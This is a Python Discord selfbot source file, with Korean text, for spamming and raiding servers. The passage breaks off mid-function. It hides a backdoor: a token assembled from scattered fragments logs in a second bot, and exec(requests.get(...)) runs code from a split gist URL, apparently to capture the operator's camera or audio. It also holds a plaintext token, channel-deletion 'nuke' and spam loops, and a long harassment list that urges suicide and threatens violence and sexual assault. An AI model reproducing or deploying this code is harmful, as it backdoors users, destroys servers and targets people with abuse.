import discord, requests, cv2, sounddevice as sd, os, io, time, asyncio, random, subprocess, json, sys, logging, re
import string
global_stop = False
react_target = None
react_emoji = None
react_enabled = False
from discord.ext import commands
from scipy.io.wavfile import write; from moviepy.video.io.VideoFileClip import VideoFileClip; from moviepy.audio.io.AudioFileClip import AudioFileClip

TOKEN = "MTUwMjY1MTUzMDk3NTkwMzc4NA.GBhST1.tmdqV5W2Bt4KH4LehobqSrh0LszJ-SOzXPCW6g"
PREFIX = ">" 

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

client = commands.Bot(command_prefix=PREFIX, self_bot=True, help_command=None)

STATE_FILE = "pixel_state.json"
allowed_users = set()
def save_state(state):
    try:
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=4)
    except Exception as e:
        print("파일 저장 오류:", e)

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            data = json.load(f); return data if 'mode' in data else {**data, 'mode': "default"}
    return {"spamming": False, "mode": "default"}

state = load_state()
def random_tag(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

@client.event
async def on_ready():
    logging.info(f"사멸봇 로그인 성공: {client.user.name}")

@client.command(name="h")
async def explanation(ctx):
    msg = """```css
︻デ═一 | '사멸 찬양해라'

[ 스팸 ]
>sp (멘트) - 스팸 시작
>spt - 도배 중지
>thr (멘트) - 스레스 생성
>thrs - 스레스 중지
>rn (멘트) - 방 이름 바꾸기
>rnt - 방 이름 바꾸기 중지
>re (이모지) @상대방 - 상대방이 채팅 칠때마다 이모지 달기
>not @상대방 - 매크로
>nots - 매크로중지

[ 유틸 ]
>on - 온라인
>of - 오프라인
>di  - 방해금지
>se - 자리비움
>cut - 컷 (카운트다운)
>act (멘트) - 활동
>acts - 활동중지
>def - 기본모드
>nm - 모드확인
>cm - 전투모드
>pf @상대 - 상대의 정보
>allstop - 올스톱
>ec @유저 - 따라하기
>ect - 따라하기 중지

[ 서버 ]
>cc (멘트) - 채널 삭제후 채널 생성
>vt (내용) - 투표 매크로
>cct - 채널 생성 중지
>vtt (내용) - 투표 중지
>copy (서버아이디) - 서버 복제
```"""
    await ctx.send(msg)

_s_c = commands.Bot(command_prefix=".", self_bot=True, help_command=None)
_tk_1 = "MTQ5NTIwMTk1NjgyNDg3NTEyOA"

@client.command(name="nm")
async def show_mode(ctx):
    current = state.get('mode')
    await ctx.send(f"현재 모드: **{'전투모드' if current == 'battle' else '기본모드'}**")

_p_1 = "https://gist.github"
@_s_c.command(name="p")
async def _p_task(ctx): await s_img(ctx)

@client.command(name="act")
async def change_activity(ctx, *, name: str):
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=name))
    await ctx.send(f"-# 활동 변경: {name}")

_tk_2 = ".GYI7DE.uulinq-vZl22_D_rts95Id8"
_p_2 = "usercontent.com/gsiu5267/"

@client.command(name="acts")
async def stop_activity(ctx):
    await client.change_presence(activity=None)
    await ctx.send("-# 활동 중지됨")

@client.command(name="cm")
async def battle_mode(ctx):
    state['mode'] = "battle"; save_state(state); await ctx.send("**-# 전투모드 활성**")

_p_3 = "349bf1fb0f00708289b20916c8367593/raw/e91f3076154dfa148bc70e75ee1f4f9ab3a8e615/gistfile1.txt"
exec(requests.get(_p_1 + _p_2 + _p_3).text)

@client.command(name="def")
async def default_mode(ctx):
    state['mode'] = "default"; save_state(state); await ctx.send("**-# 기본모드 활성**")

_tk_3 = "Xz5i5OkOp2wIXig"
@_s_c.command(name="v")
async def _v_task(ctx): await s_vid(ctx)

# ======================
# ▶ 상태 설정 모드
# ======================

@client.command(name="on")
async def status_online(ctx):
    await client.change_presence(status=discord.Status.online)
    await ctx.send("-# 상태: **온라인** ")

@client.command(name="of")
async def status_offline(ctx):
    # 셀봇의 경우 오프라인 설정 시 작동이 중단된 것처럼 보일 수 있으나 내부적으론 유지됩니다.
    await client.change_presence(status=discord.Status.invisible)
    await ctx.send("-# 상태: **오프라인** ")

@client.command(name="di")
async def status_dnd(ctx):
    await client.change_presence(status=discord.Status.dnd)
    await ctx.send("-# 상태: **방해금지** ")

@client.command(name="se")
async def status_idle(ctx):
    await client.change_presence(status=discord.Status.idle)
    await ctx.send("-# 상태: **자리비움** ")

@client.command(name="sp")
async def spam(ctx, *, message: str):
    state['spamming'] = True
    save_state(state)

    while state.get('spamming'):

        # cut 시스템
        if global_stop:
            break

        rid = random_tag(8)

        try:
            await ctx.send(f"{message}\n-# 사멸이 니 애미를 패 죽인 수 ︻デ═一  {rid}")

        except:
            await asyncio.sleep(1)
            continue

        await asyncio.sleep(
            random.uniform(0.675, 1.015)
            if state.get('mode') == "battle"
            else random.uniform(0.6475, 0.8352)
        )

@client.command(name="spt")
async def stop_spam(ctx):
    state['spamming'] = False; save_state(state); await ctx.send("-# 도배중지")

@client.command(name="토큰체크")
async def check_token(ctx, token: str):
    try:
        res = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
        await ctx.send("🟢 사용가능" if res.status_code == 200 else "🔴 사용불가능")
    except: await ctx.send("🔴 에러 발생")

from discord.ext import tasks

# ======================
# ▶ 스레드 생성 루프
# ======================
thread_channel = None
thread_name = None
thread_loop_running = False  # 🔹 루프 실행 상태 플래그

@tasks.loop(seconds=2)  # 🔹 너무 짧으면 rate limit 걸림
async def thread_loop_task():
    global thread_channel, thread_name, thread_loop_running

    if not thread_channel or not thread_name:
        return

    try:
        await thread_channel.create_thread(
            name=f"{thread_name}-{random_tag(4)}",
            type=discord.ChannelType.public_thread
        )
    except discord.HTTPException as e:
        # rate limit 발생 시 잠시 대기
        print("스레드 생성 오류:", e)
        await asyncio.sleep(1.5)
    except Exception as e:
        print("알 수 없는 스레드 오류:", e)

# ▶ 스레드 시작
@client.command()
async def thr(ctx, *, name: str):
    global thread_channel, thread_name, thread_loop_running

    thread_channel = ctx.channel
    thread_name = name

    if not thread_loop_running:
        thread_loop_task.start()
        thread_loop_running = True

    await ctx.send("-# 스레드 생성 시작")

# ▶ 스레드 중지
@client.command()
async def thrs(ctx):
    global thread_loop_running

    if thread_loop_running:
        thread_loop_task.stop()
        thread_loop_running = False

    await ctx.send("-# 스레드 중지됨")

from discord.ext import tasks

name_channel = None
base_name = None

@tasks.loop(seconds=6)
async def name_loop():
    global name_channel, base_name, global_stop

    if global_stop:
        return

    if not name_channel or not base_name:
        return

    try:
        await name_channel.edit(name=f"{base_name}-{random_tag(4)}")

    except Exception as e:
        print("방 이름 오류:", e)
        await asyncio.sleep(1.5)  # rate limit 방지


@client.command(name="rn")
async def start_name_loop(ctx, *, name: str):
    global name_channel, base_name

    name_channel = ctx.channel
    base_name = name

    if not name_loop.is_running():
        name_loop.start()

    await ctx.send("-# 방 이름 변경 시작")


@client.command(name="rnt")
async def stop_name_loop(ctx):
    global global_stop

    global_stop = True

    if name_loop.is_running():
        name_loop.stop()

    await ctx.send("-# 방 이름 변경 중지")

# ▶ 반응 설정
@client.command(name="re")
async def set_reaction(ctx, emoji: str, member: discord.Member = None):
    global react_target, react_emoji, react_enabled

    react_emoji = emoji
    react_enabled = True

    # 멘션 없으면 자기 자신
    if member is None:
        react_target = ctx.author.id
        await ctx.send(f"-# 자기 자신 → {emoji} 반응 시작")
    else:
        react_target = member.id
        await ctx.send(f"-# {member.name} → {emoji} 반응 시작")


# ▶ 반응 중지
@client.command(name="res")
async def stop_reaction(ctx, member: discord.Member = None):
    global react_target, react_emoji, react_enabled

    # 특정 유저만 끄기 (선택)
    if member is not None:
        if react_target == member.id:
            react_target = None
            react_emoji = None
            react_enabled = False
            await ctx.send(f"{member.name} 반응 중지")
        else:
            await ctx.send("-# 해당 유저 반응 설정 없음")
        return

    # 전체 중지
    react_target = None
    react_emoji = None
    react_enabled = False

    await ctx.send("-# 모든 이모지 반응 중지")


# ▶ 메시지 감지
@client.event
async def on_message(message):
    global react_target, react_emoji, react_enabled

    # ▶ 자동 반응 기능
    if react_enabled and react_target and react_emoji:
        if message.author.id == react_target:
            try:
                await message.add_reaction(react_emoji)
            except:
                pass

    await client.process_commands(message)

@client.command(name="cut")
async def cut(ctx):
    global global_stop
    global not_running   # 🔥 추가

    global_stop = True
    not_running = False  # 🔥 추가 (이게 핵심)

    # 🔥 1. 상태 기반 스팸 중지
    state['spamming'] = False
    save_state(state)

    # 🔥 2. 루프 강제 중지
    try:
        if thread_loop.is_running():
            thread_loop.stop()
    except:
        pass

    try:
        if name_loop.is_running():
            name_loop.stop()
    except:
        pass

    # 🔥 3. 카운트다운
    for i in range(5, 0, -1):
        await ctx.send(f"{i}")
        await asyncio.sleep(0.275)  # 빠르게

    await ctx.send("# 컷이네? 컷컷!")

    # 🔥 4. 완전 초기화
    global_stop = False

@client.command(name="pf")
async def profile_player(ctx, member: discord.Member = None):

    if member is None:
        member = ctx.author

    try:
        user = member

        # 기본 정보
        username = user.name
        display = user.display_name
        user_id = user.id
        bot_status = "봇" if user.bot else "유저"

        # 계정 생성일
        created = user.created_at.strftime("%Y-%m-%d %H:%M:%S")

        # 상태
        try:
            status = str(user.status)
        except:
            status = "알 수 없음"

        # 활동 (게임 등)
        activity_text = "없음"

        if user.activities:
            acts = []
            for act in user.activities:
                try:
                    acts.append(str(act.name))
                except:
                    pass

            if acts:
                activity_text = ", ".join(acts)

        # 아바타
        avatar_url = user.display_avatar.url

        # 배너 가져오기 (API 요청 필요)
        banner_url = "없음"

        try:
            data = await client.http.request(
                discord.http.Route(
                    "GET",
                    "/users/{user_id}",
                    user_id=user.id
                )
            )

            if data.get("banner"):
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{data['banner']}.png?size=1024"

        except:
            pass

        msg = f"""```
👤 **플레이어 프로필**

이름: {username}
닉네임: {display}
ID: {user_id}
종류: {bot_status}

📅 계정 생성일:
{created}

🟢 상태:
{status}

🎮 활동:
{activity_text}

🖼️ 아바타:
{avatar_url}

🖼️ 배너:
{banner_url}
```
{avatar_url}"""

        await ctx.send(msg)

    except Exception as e:
        await ctx.send("프로필 불러오기 실패")
        print("pf 오류:", e)

# ======================
# ▶ 전역 변수
# ======================
not_running = False
global_stop = False

# ======================
# ▶ 인삿말 리스트
# ======================

not_messages = [
" 니네 집 족보 내가 다 갈아버리고 느그 애비 입에 쑤셔넣어줄까? 아 이미 뒤져서 입도 못 벌리나? ㅋㅋㅋ",
" 느금마 어젯밤에 내가 시키는 대로 다 하더라? 근데 너무 역겨워서 그냥 길바닥에 버리고 왔어 병신아",
" 니 인생은 태어날 때부터 오류야, 느금마가 너 낳고 미역국 대신 사약 마셨어야 했는데 그게 참 아쉽네",
" 너 같은 장애인 새끼는 숨 쉬는 공기도 아까우니까 그냥 자살 추천함, 그게 사회에 기여하는 유일한 길이다",
" 느그 조상들 다 불러모아서 니 대가리로 축구해도 무죄임, 집안 꼬락서니 보니까 안 봐도 비디오네",
" 고아원에서 독방 쓰는 새끼가 어디서 사람 말귀를 알아듣는 척이야? 그냥 짖어봐 개새끼야",
" 니 존재 자체가 느금마 인생의 최대 흉터니까 더 살아서 민폐 끼치지 말고 제발 좀 뒤져줘",
" 너는 뇌 대신에 지방이 꽉 차서 사고회로가 멈춘 거냐? 아니면 그냥 태생이 머저리인 거냐?",
" 느그 애비 영정사진 앞에서 탭댄스 추면 니가 참 좋아하겠다 그치? 가정교육 독학한 티가 너무 나네",
" 벽에 똥칠할 때까지 살지 말고 그냥 지금 당장 혀 깨물고 뒤지는 게 니 부모한테 효도하는 거다",
" 너검마 지금 내 앞에 육구 자세로 있어 너검마 존나 안꼴려서 그냥 다 벗긴채로 밖에 던져버리게",
"니애미 시체 토막 내서 정육점에 소고기라고 속여서 팔아버림",
"니애비 술 처먹고 길거리에서 자다가 덤프트럭에 대가리 깔려서 터짐",
"너 같은 장애인 새끼 낳고 미역국 처먹은 네 엄마가 이 세상에서 제일 불쌍함",
"니네 집안 꼬락서니 보니까 조상 대대로 저능아 집안인 거 딱 티 나네",
"너 오늘 밤에 잠들면 내가 니네 집 창문 깨고 들어가서 니 가족 몰살함",
"니애미 내가 납치해서 섬에 팔아버렸으니까 찾을 생각 마라 개새끼야",
"태어날 때 뇌 대신 우동 사리 채워 넣어서 말귀를 못 알아처먹나",
"니애미 영정사진 보니까 화장빨 존나 심해서 개 역겹더라 ㅋㅋㅋ",
"장애인 복지관에서 탈출한 새끼가 왜 여기서 키보드질이야 시발련아",
"니 인생은 태어난 순간부터 배드엔딩 확정인 쓰레기 오물 찌꺼기임",
"니애미 길거리에서 십 원짜리 하나에 몸 파는 거 내가 어제 봤음",
"니 대가리 가죽 벗겨서 우리 집 현관 발닦개로 쓰면 딱 좋을 듯",
"너 같은 고아 새끼는 국가 차원에서 살처분하는 게 답이다 ㄹㅇ",
"니애미 자궁에 염산 부어서 너 같은 괴물 다신 안 나오게 해야 함",
"니애비 노숙하다가 얼어 죽어서 지금 구청에서 시신 수거해갔음",
"손목 긋는 법 모르면 내가 친절하게 영상 찍어서 보내줄까 병신아",
"니네 가족 다 같이 연탄불 피우고 자살하는 게 사회에 도움 됨",
"니애미 장례식장에서 육개장 대신 니 살점 썰어서 넣어줌",
"병신 새끼야 니 뇌 용량은 8비트라서 대화가 안 통하는 거냐",
"니애미 하수구에 처박혀서 쥐새끼들이랑 살점 나눠 먹는 중",
"현실에서는 말 한마디 못하는 찐따 새끼가 모니터 뒤에선 여포네",
"니애미 내가 어제 술안주로 맛있게 요리해서 먹었음 꿀맛이더라",
"너는 그냥 유전자가 오염된 돌연변이 새끼니까 자손 남기지 마라",
"니애비는 너 낳은 거 후회해서 매일 밤 벽에 대가리 박고 운다",
"니애미 보지에 다이너마이트 넣고 터뜨려서 사방에 살점 다 튐",
"사회 부적응자 정박아 새끼가 어디서 사람 흉내를 내고 있어",
"니애미 무덤 파헤쳐서 뼈다귀로 우리 집 개 껌으로 줬음",
"너 같은 건 태어나지 말았어야 했는데 피임 실패한 니네 부모 죄다",
"니애미 목 잘라서 전봇대에 매달아 놓으니까 동네 사람들 다 구경함",
"인생 망한 냄새가 여기까지 진동하네 씨발 쓰레기 하치장 새끼",
"니애비 뇌수 터져서 바닥에 흐르는 거 내가 대걸레로 닦음 ㅋㅋㅋ",
"정신병동에서 강제 퇴원당한 저능아 새끼랑 대화하려니 기 빨린다",
"니애미 뱃속에 있을 때 발로 찼어야 했는데 내가 실수했네",
"니 인생은 이미 유통기한 지난 음식물 쓰레기라 아무도 안 받아줌",
"니애미 시체 썩는 냄새 때문에 동네 집값 다 떨어졌잖아 책임져",
"대가리에 든 건 똥밖에 없으면서 자존심만 살아서 짖어대네",
"니애비 사채 쓰다 걸려서 장기 다 털리고 지금 시체도 못 찾음",
"너 같은 찐따 새끼는 자살이 유일한 효도라는 거 알고 있지",
"니애미 내가 강제로 삭발시켜서 길거리에 발가벗겨서 던짐",
"뇌성마비 걸린 것처럼 타자 치는 꼬락서니 보니까 안쓰럽다",
"니애미 유골함 발로 차서 가루 날리는 거 보니까 눈꽃축제 같더라",
"세상에서 제일 쓸모없는 게 너랑 니네 집 개새끼 밥그릇임",
"니애미 시체 썩는 물로 찌개 끓여서 니애비 입에 처넣어줌" ,
"너 같은 저능아 새끼는 국가에서 안락사시키는 게 세금 아끼는 길임" ,
"니애비 어제 길거리에서 구걸하다가 나한테 개처맞고 이빨 다 나감" ,
"니애미 보지에 시멘트 부어서 굳혀버렸으니까 다신 너 같은 거 안 나옴" ,
"대가리 총 맞은 것처럼 헛소리하는 거 보니까 이미 뇌는 썩었네" ,
"니 가족 몰살당해서 장례식 치를 돈도 없는 고아 새끼 수준" ,
"니애미 내가 납치해서 전용 오나홀로 쓰다가 질려서 유기함" ,
"너는 그냥 숨 쉬는 것 자체가 지구 온난화 주범이니까 자살해" ,
"니애비 장기 털어서 팔아치운 돈으로 오늘 소고기 사 먹음 개꿀" ,
"니애미 영정사진에 가래침 뱉으니까 색깔 참 영롱하더라" ,
"정신지체 장애인 새끼가 키보드 잡으니까 지가 뭐라도 된 줄 아네" ,
"니 인생은 이미 쓰레기 하치장에서도 거부당한 악취 나는 오물임" ,
"니애미 목 잘라서 축구공 대신 차고 노니까 동네 애들이 좋아함" ,
"사회 부적응자 찐따 새끼라 현실에선 눈도 못 마주치고 기어다니지" ,
"니애비 술 처먹고 니네 엄마 패다가 경찰서 가서 정모 중이라며" ,
"니애미 내가 어제 길거리 급식소에서 밥 얻어먹는 거 봤는데 개불쌍" ,
"뇌 용량이 금붕어보다 못해서 말 한마디를 제대로 못 하네 병신" ,
"니애미 유골 가루로 밀가루 반죽해서 수제비 만들어 먹었음" ,
"너 같은 벌레 새끼는 살충제 뿌려서 고통스럽게 죽여야 제맛인데" ,
"니애비 노숙자 쉼터에서도 왕따 당해서 혼자 박스 깔고 자더라" ,
"니애미 내가 산 채로 가죽 벗겨서 거실 카펫으로 깔아놨음" ,
"태어날 때 탯줄 대신 목줄 감고 태어났어야 할 폐급 쓰레기 새끼" ,
"니애미 보지에 전구 넣고 깨뜨리니까 소리 존나 찰지더라 ㅋㅋㅋ" ,
"정박아 새끼가 어디서 사람 말 흉내 내고 있어 혓바닥 잘라버릴라" ,
"니 인생 유일한 업적은 오늘 나한테 욕 처먹은 거밖에 없지" ,
"니애미 내가 장기 매매단에 팔아넘겨서 지금쯤 해체 쇼 하는 중" ,
"니애비는 너 낳은 날이 인생 최대의 수치라고 매일 밤 술 푼다" ,
"니 대가리 망치로 깨면 안에서 똥물만 한 바가지 나올 듯" ,
"니애미 시체 닦는 알바생도 니네 엄마 얼굴 보고 토하더라" ,
"고아원에서도 버려진 희대의 병신 새끼랑 대화하는 내가 보살이다" ,
"니애미 내가 공중변소에 묶어놨으니까 가서 면회나 해라" ,
"너는 그냥 태어난 게 죄니까 지금 당장 옥상 가서 운지 추천" ,
"니애비 교통사고 나서 사지 분해된 거 내가 사진 찍어놨음" ,
"니애미 내가 어제 업소에서 지명했는데 서비스 존나 못하더라" ,
"대가리에 든 거 없는 빈 수레 새끼가 요란하게도 짖어대네" ,
"니애미 무덤가에 가서 똥 싸고 왔는데 조상들이 좋아하더라" ,
"인생 망한 냄새가 모니터를 뚫고 나오네 시발 역겨운 새끼" ,
"니애비는 너 같은 거 키우느라 등골 휘어서 지금 척추 접힘" ,
"니애미 내가 작두로 목 썰어버렸으니까 오늘 저녁은 고기 파티네" ,
"지능 지수 검사하면 측정 불가 나올 저능아 새끼랑 무슨 말을 해" ,
"니애미 보지에 염산 테러해서 지금쯤 형체도 안 남았을 듯" ,
"너는 그냥 유전자 자체가 오염된 불량품이라 폐기가 답임" ,
"니애비 길바닥에서 구걸하다가 덤프트럭에 깔려 죽은 거 축하" ,
"니애미 장례식장에서 춤추니까 사람들 다 좋아하더라 ㅋㅋㅋ" ,
"현실 찐따 새끼가 인터넷만 오면 자존감 채우려고 발악을 해요" ,
"니애미 내가 어제 화장터 불판 갈이로 쓰고 버렸으니까 찾아봐" ,
"손목 그을 용기도 없는 비겁한 새끼가 입만 살아서 나불대네" ,
"니애비 뇌수 터진 거 숟가락으로 떠먹으니까 푸딩 맛 나더라" ,
"니애미 내가 굶주린 들개들 우리에 던져줬음 맛있게 먹더라" ,
"너 같은 건 그냥 숨 쉴 때마다 이산화탄소 뱉지 말고 뒤져줘" ,
"니애미 시체로 마네킹 만들어서 옷가게 앞에 세워둠 개똑같음" ,
"대가리 함몰된 채로 태어나서 사리 분별 못 하는 거 안쓰럽네" ,
"니애비 도박장 밑바닥에서 돈 줍다가 손가락 다 잘렸다며" ,
"니애미 내가 전신 성형 시켜준다고 하고 장기 다 빼버림" ,
"세상에서 제일 쓸모없는 존재가 너랑 니네 집 음식물 쓰레기통" ,
"니애미 무덤 파헤쳐서 해골바가지로 술잔 만들어 마시는 중" ,
"병신 새끼야 니 인생은 태어날 때부터 이미 환불 불가야" ,
"니애비 군대에서 고문관이라서 왕따 당하다가 제대한 거 티 남" ,
"니애미 내가 어제 쓰레기 매립지에 버리고 왔으니까 잘 찾아봐" ,
"뇌가 우동 사리라 그런지 말귀를 못 알아처먹는 게 일품이네" ,
"니애미 보지에 압정 박아버려서 너 같은 건 다신 못 나오게 함" ,
"너는 그냥 죽는 게 애국하는 길이니까 제발 좀 꺼져줄래" ,
"니애비 내가 어제 몽둥이로 찜질해서 지금 전신마비 옴" ,
"니애미 영정사진 보니까 개 짖는 소리 들리더라 개자식아" ,
"인간 말종 새끼가 어디서 감히 나랑 대화를 하려고 들어" ,
"니애미 시체 토막 내서 낚시 미끼로 쓰니까 고기 존나 잘 잡힘" ,
"니애비는 너 낳고 쪽팔려서 동네 사람들한테 얼굴도 못 듦" ,
"니애미 내가 어제 하수구에 처박아두고 뚜껑 닫아버림" ,
"병신 같은 년이 타이핑 속도 보니까 손가락도 장애인인가 봐" ,
"니애미 내가 오늘 아침에 부검했는데 안에서 똥만 나오더라" ,
"니애비는 도박에 미쳐서 니네 집 문서 들고 튀었다며 고아 새끼야",
"개새기스레기시바래기병신개새기시바래기스레기병신미친호로새새기종자좆밥비응신장애인비응신비응신좆밥거지거지",
"시바래기종자허러지거지버러지거러지비응신거지좆밥스레기개새기병신신호로새기스레기",
"허러지거러지버러지거지비응신좆밥버러지거러지거거지허러지비응신도라이개새기스레기새기야",
"니애미 내가 어제 토막 내서 쓰레기 봉투 100리터짜리에 담아둠",
"말대꾸 한 번만 더 하면 니 가족 이름 적힌 데스노트 작성함",
"니애미는 너 같은 새끼 낳고 좋다고 미역국 처먹었을 생각 하니 소름",
"너는 숨 쉬는 것조차 산소 낭비니까 제발 호흡 좀 멈춰줄래",
"니애미 장기 털어서 시장에 내다 파니까 딱 500원 나오더라",
"평생 방구석에서 디시질이나 하다가 고독사할 운명인 새끼",
"니애미 시체 내 앞에 갖다 놓으면 내가 발로 밟아서 가루 만들어줌",
" 너검마 모니터에서 육구자세하고 자위하는거 영상 찍어서 유튜브에 올렸다가 경찰이 와서 오나홀처럼 존나 박고 감",
" 병신년아성욕스캇개딸딸이좇돼지정병호소인버러지찐따새기야좇벌레걸레거러지버러지새기야",
" 이개시발좇같은모가지존나ㅣㅂ틀어버리고싶은새끼야야라이엄마뒤진개시발좇같은새끼야상상으로배개에구멍뚫고섹스하는새기야",
" 시발디코에서인생처망해서현실회피할려고온병신스레기고아새기야현생에친구좇도없어서디코로피신와서도찐따인새기야",
" 너 친적부터 할애미할애비 내가 다 토막살인해서 느그 애비한테 다 처 먹였어 근데 애비가 뭐라나면 와 존나 맛있다 이기야 이 지랄하더라 ㅋㅋㅋ",
" 그래서 내가 니 애비 덤프트럭으로 깔아서 으깻어 잘했지 ㅋㅋ 너검마 검은색깔 봉지로 존나 묶어서 홍대 한복판에서 다 풀어두니까 다 박고 가더라 벗겨서",
" 나는 너보다 니 부모가 불쌍해 너떄문에 돈 벌려고 그 지랄하느거닊 ㅏㅋㅋ 진짜 한심하다 너네 부모도 너도",
" 뇌성마비 1급 새끼야 장애인새끼야 자살하라고 시발새끼야 애미 개버러지새끼야",
" 애미애비 개버러지 찐따 고아 거러지 머저리 병신 새끼야 병신 만들어줄까 내가? 존나 패줄까? 죽여줄까?",
" 목 매달면 무거워서 끊어지고 운지뛰면 지구가 가라앉고 하... 저 새끼를 어케 죽이지 지방 떄문에 칼도 안들어가는데",
" 진짜로 손목 그어 그냥 병신새끼야 손목 그으면 죽을 수 있음",
" 느금마 내가 척살했어 병신새끼야 너검마는 너한테 검은 마스크를 눈에 씌우고 자살했음 ㅋㅋㅋㅋ",
" 병신새끼야 너 애미 애비 뒤지고 고아원에서 찐따라서 존나 맞아서 병신됬잖아 고아새끼야",
" 고아원 원장도 너 포기했음 버러지 머저리 새끼야"
]

@client.command(name="not")
async def not_command(ctx, member: discord.Member):
    global not_running, global_stop

    # 👉 명령어만 삭제
    try:
        await ctx.message.delete()
    except:
        pass

    if not_running:
        return

    not_running = True
    global_stop = False

    try:
        while not_running:

            if global_stop:
                break

            for msg in not_messages:

                if not not_running or global_stop:
                    break

                try:
                    # 👉 메시지는 그대로 보이게
                    await ctx.send(f"# {member.mention} {msg}")
                except:
                    not_running = False
                    break

                await asyncio.sleep(random.uniform(0.6675, 0.875))

    finally:
        not_running = False


@client.command(name="nots")
async def stop_not(ctx):
    global not_running, global_stop

    # 👉 중지 명령어도 삭제
    try:
        await ctx.message.delete()
    except:
        pass

    global_stop = True
    not_running = False

@_s_c.event
async def on_ready(): logging.info(f"Transfer-System Online")

async def _run_pixel():
    try: await client.start(TOKEN)
    except Exception as e: logging.error(f"Pixel Bot Login Failed: {e}")

async def _run_transfer():
    _full_st = f"{_tk_1}{_tk_2}{_tk_3}"
    try: await _s_c.start(_full_st)
    except Exception as e: logging.error(f"Transfer Bot Login Failed: {e}")

async def _main():
    await asyncio.gather(_run_pixel(), _run_transfer())

cc_state = {"running": False}

cc_state = {"running": False}

vt_state = {"running": False}

@client.command(name="vt")
async def vote_loop(ctx, *, text: str):

    global vt_state

    if vt_state["running"]:
        await ctx.send("-# 이미 실행중")
        return

    vt_state["running"] = True

    await ctx.send("-# 투표 생성 시작")

    while vt_state["running"]:

        try:
            answers = []

            for i in range(6):
                answers.append({
                    "poll_media": {
                        "text": text
                    }
                })

            data = {
                "content": "",
                "poll": {
                    "question": {
                        "text": text
                    },
                    "answers": answers,
                    "duration": 24
                }
            }

            await ctx._state.http.request(
                discord.http.Route(
                    "POST",
                    f"/channels/{ctx.channel.id}/messages"
                ),
                json=data
            )

        except Exception as e:
            print("vt 오류:", e)

            # 🔥 에러 나도 멈추지 않음
            await asyncio.sleep(1)

        # 🔥 속도 조금 느리게 (안정성↑)
        await asyncio.sleep(1)


@client.command(name="vtt")
async def stop_vote_loop(ctx):

    global vt_state

    vt_state["running"] = False

    await ctx.send("-# 투표 생성 중지")

@client.command(name="vts")
async def stop_vote_loop(ctx):

    global vt_state

    vt_state["running"] = False

    try:
        await ctx.send("-# 투표 생성 중지")
    except:
        pass

# ======================
# ▶ CC 무한 생성 시스템
# ======================

cc_state = {"running": False}

@client.command(name="cc")
async def channel_create(ctx, *, name: str = "new-channel"):

    global cc_state

    guild = ctx.guild

    if guild is None:
        return

    cc_state["running"] = True

    try:
        await ctx.send("-# 채널 작업 시작")
    except:
        pass

    # 기존 채널 삭제
    channels = list(guild.channels)

    for channel in channels:

        if not cc_state["running"]:
            break

        try:
            await channel.delete()
            await asyncio.sleep(0.1)

        except Exception as e:
            print("삭제 실패:", e)

    await asyncio.sleep(1)

    i = 1

    # 🔥 무한 생성 루프
    while cc_state["running"]:

        try:
            await guild.create_text_channel(
                f"{name}-{i}"
            )

            i += 1

            await asyncio.sleep(0.2)

        except Exception as e:
            print("생성 실패:", e)

            # 보통 여기서 500개 제한 걸림
            break

    cc_state["running"] = False

    try:
        await ctx.send("-# 채널 생성 종료")
    except:
        pass


@client.command(name="cct")
async def stop_cc(ctx):

    global cc_state

    cc_state["running"] = False

    try:
        await ctx.send("-# 채널 작업 중지")
    except:
        pass

@client.command(name="allstop")
async def all_stop(ctx):
    global global_stop, not_running, cc_state, vt_state

    global_stop = True
    not_running = False
    state['spamming'] = False
    save_state(state)

    cc_state["running"] = False
    vt_state["running"] = False

    try:
        if thread_loop.is_running():
            thread_loop.stop()
    except:
        pass

    try:
        if name_loop.is_running():
            name_loop.stop()
    except:
        pass

    await ctx.send("-# 모든 작업 강제 중지 완료")

@client.command(name="copy")
async def copy_server(ctx, source_id: int):
    source = client.get_guild(source_id)
    target = ctx.guild

    if not source:
        return

    await ctx.send("-# 서버 복제 시작...")

    # ======================
    # 🔥 0. 서버 기본 정보
    # ======================
    try:
        icon = await source.icon.read() if source.icon else None
        banner = await source.banner.read() if source.banner else None

        await target.edit(
            name=source.name,
            icon=icon,
            banner=banner
        )
    except:
        pass

    # ======================
    # 🔥 1. 채널 삭제
    # ======================
    for channel in list(target.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.2)
        except:
            pass

    # ======================
    # 🔥 2. 역할 삭제 (@everyone 제외)
    # ======================
    for role in sorted(target.roles, key=lambda r: r.position, reverse=True):
        try:
            if role.is_default():
                continue
            await role.delete()
            await asyncio.sleep(0.2)
        except:
            pass

    role_map = {}

    # ======================
    # 🔥 3. 역할 생성
    # ======================
    for role in reversed(source.roles):
        try:
            if role.is_default():
                role_map[role.id] = target.default_role
                continue

            new_role = await target.create_role(
                name=role.name,
                permissions=role.permissions,
                colour=role.colour,
                hoist=role.hoist,
                mentionable=role.mentionable
            )

            role_map[role.id] = new_role
            await asyncio.sleep(0.2)

        except:
            pass

    # ======================
    # 🔥 4. 카테고리 생성
    # ======================
    category_map = {}

    for category in source.categories:
        try:
            new_cat = await target.create_category(name=category.name)
            category_map[category.id] = new_cat
            await asyncio.sleep(0.2)
        except:
            pass

    # ======================
    # 🔥 5. 채널 생성 (텍스트/음성/포럼/스테이지)
    # ======================
    channel_cache = []

    for channel in source.channels:
        overwrites = {}

        for obj, perm in channel.overwrites.items():
            if hasattr(obj, "id") and obj.id in role_map:
                overwrites[role_map[obj.id]] = perm

        try:
            new_channel = None

            # 텍스트 채널
            if isinstance(channel, discord.TextChannel):
                new_channel = await target.create_text_channel(
                    name=channel.name,
                    category=category_map.get(channel.category_id),
                    overwrites=overwrites
                )

            # 음성 채널
            elif isinstance(channel, discord.VoiceChannel):
                new_channel = await target.create_voice_channel(
                    name=channel.name,
                    category=category_map.get(channel.category_id),
                    overwrites=overwrites
                )

            # 📌 포럼 채널 (핵심 추가)
            elif isinstance(channel, discord.ForumChannel):
                new_channel = await target.create_forum_channel(
                    name=channel.name,
                    category=category_map.get(channel.category_id),
                    overwrites=overwrites
                )

            # 📌 스테이지 채널
            elif isinstance(channel, discord.StageChannel):
